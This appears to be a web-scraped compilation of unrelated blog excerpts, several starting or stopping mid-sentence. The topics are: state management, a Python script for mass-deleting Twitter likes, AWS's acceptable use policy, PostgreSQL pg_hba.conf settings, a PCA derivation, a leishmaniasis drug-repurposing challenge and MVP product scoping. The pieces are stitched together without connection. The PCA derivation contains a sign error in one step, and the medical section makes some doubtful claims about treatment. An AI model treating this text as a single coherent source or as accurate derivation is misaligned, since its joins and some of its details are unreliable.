guarantee. It depends on the exact kind of volume, and the surrounding context.</p> </div> </div> <div> <h2 id="final-thoughts">Final thoughts</h2> <div> <p>Despite what we would like to believe, state can be avoided only in trivial cases. There are only three available options:</p> <ol><li><span>Store state somewhere. There are multiple locations where to put data: serialized in cookies client-side, serialized in a data store, replicated in-memory, etc.</span></li><li><span>Compute the state every time it’s required</span></li><li><span>A combination of the above</span></li></ol> <p>Technical experts need to be aware of the above options, as well as to know which tradeoffs each of them implies. Stop fighting state, it’s a waste of time.</p> </div> </div>   </div> </section>   </article> </div> </div></div>]]>

	<div>
		
<p>A while ago I decided to delete my ‘like’ history on Twitter.</p>



<p>Since then, I’ve discovered interesting ways in which Twitter’s engineering makes it impossible to do.</p>



<p>The recent ones are easy, if you have access to the <a href="https://developer.twitter.com/en/docs/basics/getting-started" target="_blank" rel="noreferrer noopener">Twitter API</a>. You can request the list of ‘favorites’ (they never renamed them to ‘likes’ on the API layer) and from there you can <a href="https://developer.twitter.com/en/docs/tweets/post-and-engage/api-reference/post-favorites-destroy" target="_blank" rel="noreferrer noopener">delete them</a>, one at a time.</p>



<pre><code lang="python">#!/usr/bin/env python3
import os
import twitter

api = twitter.Api(
    os.environ['CONSUMER_KEY'], os.environ['CONSUMER_SECRET'],
    os.environ['ACCESS_TOKEN_KEY'], os.environ['ACCESS_TOKEN_SECRET'],
    sleep_on_rate_limit=True
)
while True:
    favorites = api.GetFavorites(count=200)
    if not favorites:
        break
    print(f"GetFavorites(): Received {len(favorites)} status objects.")
    for status in favorites:
        print(f"{status.user.screen_name:20}: {status.text}")
        status = api.DestroyFavorite(status_id=status.id)
</code></pre>



<p>From the looks of things, you can delete the most recent 3,000 or so ‘likes’ you’ve ever made using a script like this.</p>



<p>After that, things get harder.</p>



<hr>



<p>I’ve been thinking about what a ‘like’ on Twitter and Facebook means.</p>



<p>When you click it, you’re sending a single piece of information to the person who wrote the tweet. Ostensibly, I guess, that you liked their tweet. Really it’s just read-receipt for Twitter — you’re just telling someone that you read what they wrote. If you’re mentioned in a tweet it seems almost <em>fait accompli</em> that you’re going to hit ‘like’. It means “yeah yeah, I got your message”, and not much else.</p>



<p>After that, it just sits there, in your history, and in Twitter’s database. It becomes part of their algorithm to tune your feed to keep you hooked.</p>



<hr>



<p>Once you’ve deleted all the ‘likes’ that the API will allow you to see, you’ll find, to your surprise, that there are still thousands to go. They show up on your ‘likes’ page, and they show up in your exported data archive, but the little red ‘heart’ isn’t active.</p>



<p>I guess these ‘likes’ are in some sort of static cold storage. I’d be fascinated to hear from a Twitter engineer (a) how it works, and (b) why they still work for Twitter.</p>



<p>You can’t delete them, the platform doesn’t treat them as ‘liked’ tweets at all.</p>



<p>The only way to get rid of them is to is to click the heart twice: to ‘like’ it anew and then ‘unlike’ it. This sends the author  and anyone mentioned a fresh notification telling them that you liked their tweet.</p>



<p>If you want to delete your old history of tweets. You’re going to have to send a new notification to every single person in every single tweet you’ve ever liked. Thousands upon thousands of them. For tweets that can be years old.</p>



<hr>



<p>I like it when people like my tweets. I come up with witty, snarky things to say so that people click ‘like’. I want to write more of them. It keeps me coming up with ‘tweetable’ things to say.</p>



<p>At its most cynical, “like” is the endorphin button: Every time you like someone’s tweet you’re sending them a tiny little burst of pleasure that keeps them addicted to Twitter.</p>



<p>The sad thing is, the better you <em>are</em> at twitter — the better you are at pithy, wry sarcasm in short form — the more effective you are at keeping everyone else addicted to an intentionally-addictive platform.</p>



<p>We all are each other’s drug pushers.</p>



<hr>



<p>The only way someone won’t get a notification when you “like” their tweet is if (a) they don’t follow you, and (b) you set your account to ‘private’ mode first.</p>



<p>To get an exhaustive list of the tweets you’ve liked, you have to download your Twitter “data archive”, a <code>.zip</code> file of all data Twitter keeps on you (that they want to admit to). In the <code>date/like.js</code> file is the list of all the likes, along with their ID numbers.</p>



<p>This would be enough to use the API to ‘like’ and ‘unlike’ each tweet, but if you want to reduce the disruption to others you need to take more steps.</p>



<p>I used the Twitter API to retrieve the full details of every Tweet in the list so that I could group them by author and by accounts mentioned in the Tweet. I ended up writing some unreasonable amount of Python and SQLAlchemy code to correlate them all.</p>



<p>My plan was to group the operations so that I could (a) prevent notifications to strangers by being in ‘private mode’ whenever I was running my program, and (b) when it came time to disrupt my friends’ by sending them notifications, I’d try to group them all so it all happened at once instead of spread out over interminable days of hundreds of notifications.</p>



<p>It <em>would</em> be hundreds, after all: your likes are pretty proportional to the tweets you see. The tweets you see most tend to be the friends you’ve followed the longest.</p>



<p>I started working my way through the list. A couple of times a day the routine was:</p>



<ul><li>set my twitter profile to ‘protected mode’</li><li>start my script. Watch it chug through ‘liking’ and ‘unliking’ a stream of tweets</li><li>crash when the rate limit was hit</li><li>reset my Twitter profile to ‘public’ mode</li><li>wait a couple hours, and repeat</li></ul>



<p>For friends of mine who’s tweets I’d liked *hundreds* of times, I either <strong>blocked</strong> them first so they wouldn’t get notifications (knowing I could unblock them afterwards, and invite them to re-follow me), or I tried to message them first to warn them that I was about to spam them.</p>



<figure><div>
<blockquote data-width="525" data-dnt="true"><div lang="en" dir="ltr"><p>Dear friends, over the next several days you're likely to see every tweet of yours I've ever "liked" get a fresh "like" notification — even years-old ones.</p><p>They're all good tweets.</p></div>— Tom Eastman (@tveastman) <a href="https://twitter.com/tveastman/status/1260676895328198656?ref_src=twsrc%5Etfw">May 13, 2020</a></blockquote>
</div></figure>



<p>For the people who get scores-to-hundreds of notifications, having this tweet pinned on the top of my profile would at least give them some explanation as to what the hell was happening.</p>



<figure><div>
<blockquote data-width="525" data-dnt="true"><p lang="en" dir="ltr">OKAY, THIS MAKES MORE SENSE NOW</p>— Dr Sophia Frentz 🌈 (@SophiaFrentz) <a href="https://twitter.com/SophiaFrentz/status/1261194791729020933?ref_src=twsrc%5Etfw">May 15, 2020</a></blockquote>
</div></figure>



<p>It definitely weirded people the hell out though. Some of my friends politely removed me till it was done.</p>

</div></figure>



<p>I also accidentally re-started conversation threads left hanging years previously, thanks to the fresh notification on an old tweet.</p>



<figure><div>

</div></figure>



<p>But finally, after about two weeks of running the script at least once a day until rate-limited, I had finally deleted all my likes. Finally, I had a clean slate.</p>



<p>Only, I didn’t.</p>



<figure><img src="https://tom.eastman.nz/wp-content/uploads/2020/06/completionists-gonna.png" alt="" srcset="https://tom.eastman.nz/wp-content/uploads/2020/06/completionists-gonna.png 609w, https://tom.eastman.nz/wp-content/uploads/2020/06/completionists-gonna-340x243.png 340w" sizes="(max-width: 609px) 100vw, 609px"><figcaption>Completionists gonna have a hard time with this</figcaption></figure>



<p>You can’t delete a like on an old tweet without ‘liking’ the tweet again.</p>



<p>It turns out that there are plenty of tweets old tweets you might have hit ‘like’ on once, but you can’t see any more.</p>



<p>Tweets from deleted or suspended accounts <em>remain</em> in the count even if they’re not visible by the system. Tweets by people who you don’t follow who have protected their accounts are inaccessible.</p>



<p>Tweets that you liked, by Twitter users who have subsequently blocked you, can never, ever by removed by you.</p>



<p>And so, at the end of the day, I can no longer see my liked tweets, but maybe you can. And some of the tweets will be people who no longer follow me, and some of them — there forever — will be from people who loath me.</p>



<hr>



<p>What was the point of all this?</p>



<p>When it became obvious that I wasn’t going to be able to delete my like history without sending thousands of notifications. I decided to press on with the project because I wanted to see exactly what social cost Twitter would exact upon me, just for trying to reclaim my own data.</p>



<p>I didn’t measure how many people unfollowed me, but I certainly got some bewildered reactions. I had friends reach out to me out-of-band to ask me if my account had been hacked.</p>



<p>And for all that, it turned out to be un-completable. Twitter will not allow you the means to completely wipe your “like” history short of actually deleting your account.</p>



<p>‘Likes’ might not seem important. But it’s critical to the sorts of algorithms social media use to tune their feeds to keep you hooked, and to target you with advertising. They’re also a paltry, lazy mode of communication. From now on, if I like someone’s tweet, I’ll conjure the mental effort to at least tell them so, with words.</p>

I actually quite like AWS and its offerings. I’m making this post because I’m genuinely curious
how to interpret the <a href="https://aws.amazon.com/aup/">AWS Acceptable Use Policy</a>. The static content for this blog is hosted within an
AWS S3 bucket. Does saying “Fuck You AWS” constitute offensive content?</p>

<p>The section titled ‘No Illegal, Harmful, or Offensive Use or Content’ says:</p>

<blockquote>
  <p>You may not use, or encourage, promote, facilitate or instruct others to use, the Services or AWS Site for any illegal, harmful, fraudulent, infringing or offensive use, or to transmit, store, display, distribute or otherwise make available content that is illegal, harmful, fraudulent, infringing or offensive. Prohibited activities or content include:</p>
</blockquote>

<blockquote>
  <p>Offensive Content. Content that is defamatory, obscene, abusive, invasive of privacy, or otherwise objectionable, including content that constitutes child pornography, relates to bestiality, or depicts non-consensual sex acts.</p>
</blockquote>

<p>“Otherwise objectionable” seems to cast a very wide net.
One of my <a href="http://thoughts.josephdeon.me/2020/07/01/hello-weblog.html">three goals</a> for self hosting this blog was ownership. To me part of
ownership is being able to express myself freely. I hoped that meant as
long as I worked within the confines of the law I would be in the clear.</p>

<p>If this post gets removed then I know I have not fully achieved my ownership goal and it
might be time to just host on a pi.</p>

<p><br>
P.S. I posted this to hackernews. It made it to the front page and generated <a href="https://news.ycombinator.com/item?id=23717254">some discussion</a>.</p>

<p>PostgreSQL instance has got restricted access by <code>pg_hba.conf</code> file(host based authentication file).</p>
<p>We can provide in it information from which <code>ADDRESS</code> to which <code>DATABASE</code> on which <code>USER</code> by what <code>METHOD</code> we allow connecting. Additionaly we have to provide <code>TYPE</code> of connection.</p>
<p>This file resides in same place where <code>postgresql.conf</code>(we can alter this behavior by setting <code>pg_hba</code> parameter in <code>postgresql.conf</code>):</p>

<ul>
<li><code>local</code> - socket connection - needed to connect from shell on database server</li>
<li><code>host</code> - standard TCP/IP connection over the network - bnost SSL and no SSL</li>
<li><code>hostssl</code> - TCP/IP connection but only with SSL</li>
<li><code>hostnossl</code> - TCP/IP only without SSL</li>
<li><code>hostgssenc</code> - TCP/IP only GSSAPI</li>
<li><code>hostnogssenc</code> - TCP/IP only without GSSAPI</li>
</ul>
<p>With <code>DATABASE</code> we can specify database name or use special value <code>sameuser</code> if database name should be same as name of user that is connecting.</p>
<p>With <code>USER</code> we can specify user or role - role name should be preceded by <code>+</code> sign.</p>
<p><code>ADDRESS</code> field could be - hostname, IP range in CIDR format or special words:</p>
<ul>
<li><code>samehost</code> - which correspond to all IP adresses of database server</li>
<li><code>samenet</code> - which correspond to all IP in database server subnet</li>
</ul>
<p>With <code>METHOD</code> field we can set one of authentication methods - most important ones are:</p>
<ul>
<li><code>trust</code> - allow connection without password - moslty set for local connections from database server itself</li>
<li><code>reject</code> - reject connections</li>
<li><code>md5</code> - allow connections after getting from user password - encrypted</li>
<li><code>password</code> - allow connection after getting plain password - DO NOT USE in untrusted networks - better -&gt; never use this option</li>
<li><code>ldap</code> - getting account authorization data from LDAP server</li>
</ul>
<p>In <code>DATABASE</code> and <code>USER</code> fields you can specify special word <code>all</code> if you don’t want to create any restrictions here.</p>
<p>There can be situation when we must use additional field named <code>auth-options</code> for specyfying details for example for <code>hostssl</code> connection type. This topic will be covered in another post.</p>

As an individual contributor, career ladders tell me what the company ostensibly values (and, by omission, what it doesn't value).</p> <p>I recently compiled this list of career ladders and figured I would share it here.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>In this post, we’ll take a deep dive into PCA, from both a mathematical and implementation perspective.
We’ll derive the equation from the ground up, look at how we can compute it and finally end with what it can be used for. This post is primarily targeted at those with a basic understanding of PCA but want to know the assumptions it relies on, its properties and derive how it can be computed.</p>
<p>If you’re interested in the repository containing the Jupyter notebook from which this is derived, it’s 
<a href="https://github.com/ymohamedahmed/blog-posts/tree/master/pca" target="_blank" rel="noopener">here</a>.</p>
<h2 id="the-optimal-coding-perspective">The optimal coding perspective</h2>
<h3 id="finding-a-low-dimensional-representation">Finding a low dimensional representation</h3>
<p>PCA can be thought of as finding a low-dimensional representation of a set of vectors. Given points in an <em>n</em>-dimensional space, we might wish to find some new <em>k</em>-dimensional space (with <em>k</em> &lt; <em>n</em>) which captures as much of the <em>essence</em> of the original space as possible. The exact definition of capturing the ‘<em>essence</em>’ is subject to design, however, we can consider it from multiple perspectives.</p>


<p><img src="https://ymohamedahmed.github.io/post/pca/images/pca.svg"></p><h3 id="the-notion-of-reconstruction-error">The notion of reconstruction error</h3>
<p>If we take our low-dimensional representation and attempt to recover the original <em>n</em>-dimensional vector of each point, we could measure how much each point varies from its reconstruction. The difference between each reconstruction and the original, is one way of measuring the effectiveness of our new <em>k</em>-dimensional space and is the approach taken by PCA.  Naturally, this requires a definition of a <em>similarity</em> between two matrices. If we have a matrix $X$ of our original points and our reconstruction $X'$ then we can define the difference between them as a sum of the square of errors $\sum_{i,j} (X-X’)_{i,j}^2$.</p>
<p>This quantity is known as the <em>Frobenius</em> norm of the matrix $||X-X'||_F$ and is essentially an extension of the L2 ($||\mathbf{v}||_2^2 =  \sum_i \mathbf{v}_i^2 = \mathbf{v}^\top \mathbf{v}$) norm from vectors to matrices. It is just a fancy name for squaring every element in a matrix and taking their sum. Crucially, however, we can see that the Frobenius norm of a matrix, $A$, is precisely equivalent to $Tr[A^\top A]$ (see the illustration below).</p>

    <figcaption>Showing the relationship between the Frobenius norm and trace operator: $||A||_F^2 = \text{Tr}(A^\top A)$</figcaption>
</figure> 

<p>As a result, our error of interest, can be computed as $Tr[(X-X’)^\top (X-X’)]$, this will come in handy since the trace operator comes with a bunch of neat tricks for manipulating the matrices involved.</p>
<h3 id="pca-assumptions">PCA Assumptions</h3>
<p>We’ve defined how we’re going to evaluate this reconstruction, but not at all the means of performing the coding or its inverse.</p>
<p>PCA chooses to implement both the encoding and decoding as a matrix multiplication. So we can think of PCA as finding a matrix $D$ that will transform our input, $X$ to our coded version $C$ by a matrix multiplication (i.e. $C = XD$).
The matrix, $X$, being our original data of $m$ rows and $n$ columns.</p>
<p>We might choose, however, to use some matrix, $D_k$ which reduces the number of dimensions of our data from $m$ to $k$. To make it easier, we can tag the matrix with the new number of dimensions. If this is the case, then $D_k$ is of size $n \times k$ and so that the resulting coding, $C$, is of size $m \times k$.</p>
<p>One of the most crucial assumptions made by PCA is that the transformation matrix, $D_k$, has <strong>orthonormal</strong> columns. Criticially, this does not, technically, make it an <strong>orthogonal</strong> matrix since it may not be square and the rows may not be orthonormal.</p>
<p>This assumption is useful since it simplifies the reconstruction process, in fact, $X'$ can be computed as $XD_kD_k^\top$, i.e. we can use the transpose of the encoding matrix to perform the decoding.</p>
<p>To understand exactly why the reconstruction can be performed by the transpose of the matrix let’s consider a code $\mathbf{z}$ which we’ve generated as $\mathbf{z}=\mathbf{D}\mathbf{x}$ and are decoding using $\mathbf{D}^\top$.</p>
<p>The reconstruction error is $(\mathbf{x}-\mathbf{D}^\top\mathbf{z})^\top(\mathbf{x}-\mathbf{D}^\top\mathbf{z}) = \mathbf{x}^\top\mathbf{x} - \mathbf{x}^\top\mathbf{D}^\top\mathbf{z}-\mathbf{z}^\top\mathbf{D}\mathbf{x} + \mathbf{z}^\top\mathbf{D}\mathbf{D}^\top\mathbf{z}$.</p>
<p>We can take the derivative with respect to the code $\mathbf{z}$, $\nabla_\mathbf{z} = -2\mathbf{D}\mathbf{x} + 2\mathbf{D}\mathbf{D}^\top\mathbf{z}$, which given the definition of $\mathbf{z}$ is equal to $-2\mathbf{D}\mathbf{x} + 2\mathbf{D}\mathbf{D}^\top\mathbf{D}\mathbf{x}$.</p>
<p>We defined our matrix to have orthonormal columns so we know that $\mathbf{D}^\top\mathbf{D} = \mathbf{I}$ because the dot product of each column with itself will be one. Hence, our gradient is  $-2\mathbf{D}\mathbf{x} + 2\mathbf{D}\mathbf{I}\mathbf{x} = \mathbf{0}$. This tells us that our encoding/decoding system is at a stationary point in the reconstruction error. Note that this only tells us for an individual point that was encoded with a matrix that has orthonormal columns, decoding with the transpose is a good idea. It doesn’t tell us anything about how to pick $\mathbf{D}$ or what happens if you use it for multiple points.</p>
<p>Given these assumptions, we can reframe our problem as finding the coding matrix which minimises the reconstruction error.</p>
<p>This means that formally, for some given value $k$, we wish to discover the matrix $D_k^*$.</p>
<p>$$D_k^* = argmin_{D_k} ||X-X'||_F =  argmin_{D_k} ||X-XD_kD_k^\top||_F$$</p>
<h3 id="discovering-the-coding-function">Discovering the coding function</h3>
<p>Given that we wish to minimise the reconstruction error, let us attempt to discover the transformation precisely capable of this.</p>
<p>We’ll need a few tricks to get us there.</p>
<ul>
<li>$(A+B)^\top = A^\top + B^\top$</li>
<li>$(AB)^\top = B^\top A^\top$</li>
<li>$(A^\top)^\top = A$</li>
</ul>
<p>From the visual illustration, recall that we can write the reconstruction error as $\text{Tr}((X-XD_kD_k^\top)^\top(X-XD_kD_k^\top))$.</p>
<p>By using the rules  this can be expanded into $$\text{argmin}_{D_k}\text{Tr}(X^\top X -X^\top XD_kD_k^\top - D_kD_k^\top X^\top X + D_kD_k^\top X^\top XD_kD_k^\top)$$</p>
<p>We are, however, only interested in the effect of the matrix $D_k$ so we’ll axe the first term $$\text{argmin}_{D_k}\text{Tr}(-X^\top XD_kD_k^\top - D_kD_k^\top X^\top X + D_kD_k^\top X^\top XD_kD_k^\top)$$</p>
<p>Crucially, however, the trace operator has two useful properties for us:</p>
<ul>
<li>it’s insensitive to cyclic permutations (i.e. $\text{Tr}(ABC) = \text{Tr}(CAB) = \text{Tr}(BCA)$)</li>
<li>the trace of a sum of matrices is the sum of their traces (i.e $\text{Tr}(\sum_i \mathbf{A}_i) = \sum_i \text{Tr}(\mathbf{A}_i)$)</li>
</ul>
<p>Given this, we can write the equation of interest as: $$\text{argmin}_{D_k}-2\text{Tr}(-X^\top XD_kD_k^\top)+ \text{Tr}(D_kD_k^\top X^\top XD_kD_k^\top)$$.</p>
<p>Furthermore, since we define the columns of $D_k$ as being orthonormal, $\mathbf{D}_k^\top \mathbf{D}_k = \mathbf{I}$ and so we can rewrite the second term as $\text{Tr}(\mathbf{D}_k^\top \mathbf{X}^\top  \mathbf{X}\mathbf{D}_k)$ which matches the form of the first term (from permuting it) and therefore can be written as the following maximisation.</p>
<p>$$\text{argmax}_{\mathbf{D}_k} \text{Tr}(\mathbf{D}_k^\top \mathbf{X}^\top  \mathbf{X}\mathbf{D}_k)$$</p>
<p>This is sets up exactly the quantity that PCA is attempting to maximise.</p>
<h4 id="relationship-with-eigendecomposition">Relationship with eigendecomposition</h4>
<p>Having happily derived the maximisation problem, I’ll do my best to convince you that this is, in fact, maximised by having the k-columns of $\mathbf{D}_k$ as the k eigenvectors of $\mathbf{X}^\top\mathbf{X}$ with largest eigenvalues. This will roughly take the form of an inductive proof. So let’s start with considering $k=1$, that is if we had the choice of using a single vector, what would we go with?</p>
<h5 id="base-case">Base case</h5>
<p>We’ll use the lowercase, $\mathbf{d}$, to emphasise that it’s a vector rather than matrix. So let’s try and tackle:</p>
<p>$$\text{argmax}_{\mathbf{d}} \text{Tr}(\mathbf{d}^\top \mathbf{X}^\top  \mathbf{X}\mathbf{d})$$</p>
<p>The trace of a scalar, is defined as itself, so we wish to find $$\text{argmax}_{\mathbf{d}} \mathbf{d}^\top \mathbf{X}^\top  \mathbf{X}\mathbf{d}$$</p>
<p>However, recall that we mandated as our first assumption that the columns of $\mathbf{D}$ are orthonormal and hence we know that $\mathbf{d}^\top\mathbf{d} = 1$.</p>
<p>This allows us to reframe this as a constrained optimisation problem and use Lagrange multipliers to discover which vector minimises the quantity of interest whilst satisfying the norm constraint. For convenience, we’ll use $\mathbf{A} = \mathbf{X}^\top  \mathbf{X}$.</p>
<p>Hence we can write this as:
$$L(\mathbf{d}, \mathbf{A}, \lambda) = \mathbf{d}^\top \mathbf{A}\mathbf{d} - \lambda(\mathbf{d}^\top \mathbf{d} - 1)$$</p>
<blockquote>
<p>TL;DR Lagrange multipliers are just a technique for optimising a function over a specific region, in our case we’re not looking for all vectors but only ones with a norm of 1. We rewrite the function to include the constraint and take the derivative of the new function, known as the <em>Lagrangian</em>.</p>
</blockquote>
<p>By taking the derivative of $L$ we can find the solution.</p>
<p>$$\frac{\partial L}{\partial \mathbf{d}} = 2\mathbf{A}\mathbf{d} - 2\lambda\mathbf{d}$$</p>
<p>The derivative is precisely zero when $\mathbf{A}\mathbf{d} = \lambda\mathbf{d}$, that is when $\mathbf{d}$ is an eigenvector of the matrix $\mathbf{A}$.
Furthermore, we can see that the quantity in fact takes on the associated eigenvalue since $\mathbf{d}^\top \mathbf{A}\mathbf{d} = \mathbf{d}^\top \lambda\mathbf{d} = \lambda $, where $\lambda$ is the associated eigenvalue. This is always possible since we can mandate that the eigenvector has a unit norm.</p>
<p>Hence, we can see here that for the base case, the best vector is the eigenvector with the largest eigenvalue.</p>
<h5 id="inductive-step">Inductive step</h5>
<p>Having showcased our hypothesis for $k=1$, let’s see what happens for other values of $k$. Precisely, let us show that if our hypothesis is true for some arbitrary $k$ then it is also true for some $k+1$. That is the best encoding matrix with $k+1$ columns, consists of the $k+1$ unit eigenvectors with the largest associated eigenvalues.</p>
<p>We are now interested in the following problem.</p>

<hr>
<p>Leishmaniasis is a <a href="https://www.dndi.org/diseases-projects/leishmaniasis/">neglected disease</a>. As a disease of poverty, it has historically received <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3530408/">limited funding</a> for discovery, development and delivery of new tools. Current treatment is costly, lengthy, painful and sometimes toxic. Like a handful of similar diseases, it is the scourge of whole regions affected by them, because we still miss cheap, safe and effective cures for them.</p>
<p>At the same time, new drug candidates are being developed and old ones are being tested every day. Today, millions of drug activity assays are available at the press of a button. In this Indaba Grand Challenge, we dare to ask you to help identify amongst the already known, tested and (often) approved drugs, potential cures for different forms of leishmaniasis.</p>
<h2>Leishmaniasis</h2>

<p>Humanity has been remarkably successful in curing most of communicable diseases, be it of bacterial or viral origin. However, there remains a whole group of diseases that largely evade successful treatment – the ones transmitted by parasites. Large number of them is caused by a group of small, single-celled animals named <em><a href="https://www.dndi.org/wp-content/uploads/2018/12/Rao_Drugdiscoverykinetoplastiddiseases_ACSInfectiousDiseases_2019.pdf">kinetoplastids</a>. </em>They cause such diseases as African sleeping sickness (caused by <em>Trypanosoma brucei</em>), Chagas disease (<em>Trypanosoma cruzii</em>) and&nbsp; Leishmaniasis (different <em>Leishmania</em> species). </p>

<p>Leishmaniases (as it is a whole group of diseases), are spread by bites of sandflies and readily communicated between animals (such as dogs). Out of 30 species that attack animals, 21 affect humans. There are more than 350 million people in nearly 90 countries, that live in areas where leishmaniasis is common. Around 90% of its most dangerous variant – visceral leishmaniasis –&nbsp; is recorded&nbsp; in Bangladesh, Nepal, Sudan and Brazil, but disease is prevalent also in Mexico, South and Central America, Asia (excluding the South-East Asia), Middle East, southern Europe and Africa (in particular North and East Africa) .</p>

<p>Every year approximately 12 million people are afflicted with the disease, with over 2 million new cases each year, most of which is a cutaneous (skin) leishmaniasis (nearly 1.5 million), but nearly 25% comprises the most lethal, visceral variant. Parasite suppresses the host’s immune system to avoid eradication, which often leads to frequently lethal secondary respiratory infections.&nbsp; Yearly, approximately 50 thousand people die worldwide because of <em>Leishmania </em>caused diseases.  </p>
<p>Visceral leishmaniasis causes swelling, malaise, wasting, damages spleen and liver, as well as leads to characteristic graying of skin (hence the name <em>black fever</em>). The fever caused by the disease lasts for more than two weeks and does not abate with antimalarial drugs. The cutaneous type makes for wide-spread sores that can take over a year to heal, and lead to necrosis (dying of tissue). It leads to scars on the face, neck, arms and legs. The third, mucocutaneous type causes both skin and mucosal ulcers, leading to the damage of soft tissues and cartilage, predominantly of nose and mouth area. All types tend to co-occur with AIDS (approximately 1 in 60 AIDS patients in south of France suffers from leishmaniasis).</p>

<p> The treatment for visceral leishmaniasis is problematic and relies mostly on antibiotics, which have a variable success rate. The most commonly used non-antibiotic drugs, containing pentavalent antimony (such as sodium stibogluconate or meglumine antimonate) are toxic to the heart, kidneys, pancreas and bone marrow of the patient, leading to headaches, abdominal issues, vomiting and low levels of blood platelets. They also require a month-long treatment through injections, as medication does not work well if taken by mouth. There is no safe treatment for cutaneous leishmaniasis, that would work dependably, with fluconazole (an antifungal medication) and pentamidine (an antimicrobial used for other kinetoplastid diseases) being the most promising support medications. Miltefosine, the first promising oral treatment for visceral leishmaniasis, tends to be effective for cutaneous form, but has limited use, as it is known to cause birth defects. </p>
<p>In the recent years a massive drug discovery campaign has led to discovery of a new drug (codenamed GNF6702) and its analog (a new, improved version, named NITD689), which affect parasites ability to degrade unnecessary and damaged proteins. While these drugs seem to work against a wide range of pathogens (including these causing African sleeping sickness, Chagas disease and visceral leishmaniasis), they are not effective against the other leishmaniases. Additionally, there is an emerging mutation among the parasites, that already now renders the drug ineffective. Therefore, even though it is currently successful in the clinical trials, it will most likely not lead to the eradication of the disease.&nbsp;  </p>
<p>There is a dire need for a new, safe therapy for kinetoplastis, one that can be administered earlier, with lesser likelihood of bothersome side effects, one that could eradicate these diseases once and for all. Finding this therapy is the goal of this Indaba Grand Challenge, and literally lives are at stake. The approach to identify potential cure candidates is drug repurposing. </p>
<h2>What is Drug Repurposing?</h2>
<figure><img src="https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing.jpg" alt="" srcset="https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing.jpg 910w, https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing-300x198.jpg 300w, https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing-768x508.jpg 768w, https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing-85x56.jpg 85w, https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing-234x155.jpg 234w" sizes="(max-width: 910px) 100vw, 910px"><figcaption>Photo Credit: pixabay.com</figcaption></figure>
<p>Drug repurposing is the act of researching if an existing drug can be used for new therapeutic purposes. It’s something that has been done for centuries. A large amount of medications on the market right now are used for multiple purposes: for instance, aspirin is a pain reliever and also a blood thinner, ibuprofen is also used for pain relief, and for reducing inflammations.</p>
<p>The high cost of research and development involved in finding new drugs means that most of these will be targeted to “First World” countries to generate returns.</p>
<p>For “neglected diseases” or “tropical diseases”, drug repurposing is used as a sort of universal strategy: it lowers the costs of research and production and the time needed for clinic trials, which is why you’ll find that many of these diseases use medication that was originally used for other illnesses.</p>
<h2>The Challenge </h2>
<p>Drug discovery methods and pipelines are well described and modular. Each can be decomposed into smaller pieces, which can be rearranged and modified. All of these pipelines rely heavily on knowledge representation, pattern detection and building of statistical models.</p>
<p>The goal of this Indaba Grand Challenge is to, through the use of standard techniques and publicly available data on drugs, drug targets and kinetoplastids (parasites causing amongst other leishmaniasis), identify either:</p>
<ul>
<li>Compounds among known, approved drugs which can target known drug targets in <em>Leishmania </em>(especially one of the 15 species known to cause the cutaneous type of disease)<em> </em>in addition to their official use.</li>
<li>Compounds among known, approved drugs with sufficiently similar targets in the goal organisms to the targets in kinetoplastids.</li>
</ul>
<p>Importantly, the verification of a drug-target interaction is possible and routinely done <em>in silico</em>. However, not all drug-target combinations can be verified, due to sheer combinatorial expansion and limited computational resources. In addition, the identification of similarities and analogies between known experimental data is far from trivial and, despite the existence of numerous approaches, cannot be solved by one statistical technique alone.</p>
<p>By launching this Grand Challenge, and true to the core values of Deep Learning Indaba, we aim to build a <strong>collaborative effort</strong>, joining experts and enthusiasts in machine learning and software engineering, with doctors, epidemiologists, medicinal chemists and policy experts, to create a <strong>synergistic effect at scale</strong>. Our vision, if it becomes true, is one where interesting discoveries of the community are taken up by the experts, and conclusions of the experts are fed back to the community to iteratively improve on its findings and make breakthroughs possible. <strong>No single person can do it perfectly, but through a joint effort, together we can. </strong></p>
<h2> Challenge Specs </h2>
<p><strong>Goal:</strong> Propose a new treatment, comprising an <em>Leishmania </em>protein (either from a defined species, or a protein present in the proteome of one or more of the <em>Leishmania </em>species) and a small molecule (or set of small molecules). Submission can be specified as:</p>
<ul>
<li>Small molecule (SMILES/SMARTS string or SDF file) and a protein name</li>
<li>PDB file with a structure of a target and a bound small molecule</li>
</ul>
<p><strong>Available resources: </strong>We have put together a list of available resources and additional material <a rel="noreferrer noopener" aria-label=" (opens in a new tab)" href="https://deeplearningindaba.com/grand-challenges/leishmaniasis/resources/" target="_blank">here</a>.</p>

The issue has to do with how new features and new products are defined. Regardless of the client’s experience building digital products, SaaS, mobile apps, web apps, the majority generally tend to screw this up. As a Product Design Consultant, I haven’t worked on one feature where I didn’t have to provide clarity to strip down and simplify the scope. The real issue is that the client tends to give little thought to the product scope (amount and complexity of features) for the first version and how it feeds into the second version, through user feedback and analytics data, and how that feeds into the third version. Whatever you think your Minimal Viable Product is, can be stripped much further down.</p><p>I have a few theories as to why clients make this mistake.&nbsp;</p><ul data-rte-list="default"><li><p>They’re too passionate and excited about the new feature or product, so there is a lot of attachment to the final product vision, which makes for emotional decision making</p></li><li><p>They have a really grand vision and they *think they’ve stripped down the scope to the core, when they haven’t</p></li><li><p>They think they have to build everything because of a bureaucratic reason</p></li><li><p>They think the user won’t like the feature or product, because the real value is in the combination of all of those features being in one place</p></li></ul><p>This mistake is important because building too much, too fast, will create a larger time frame between their starting point and their point of receiving positive feedback from users (qualitative feedback, product market fit, user analytics data or some KPI). This larger gap will lead to them running out of resources faster, whether it’s funding, or psychological motivation to continue.</p><p>I will use a couple of examples based on real clients I’ve worked with to explain my theory and how to go about the thinking.&nbsp;</p><p>1- The client was building a SaaS analytics dashboard for an enterprise use case. As with any data visualization dashboard, giving the user the ability to see an overview snapshot of data to answer their underlying business question is the primary goal, and the secondary goal is for them to dig deeper into specific data points to further uncover information that will guide their business decisions. The first step is to build the primary overview dashboard with the snapshot 30,000 ft view of the data and optimize that in the first version, then focusing on iterations. The second step is to build the deep dive views. If there is no interaction with the overview of the data because it’s deemed not interesting enough, because it’s answering the wrong business questions that the user doesn’t actually care about, then the deep dive views don’t matter, the user won’t try to dive deep into something irrelevant. The way to measure the interaction with the snapshot view of the data without having built the deep dive views was 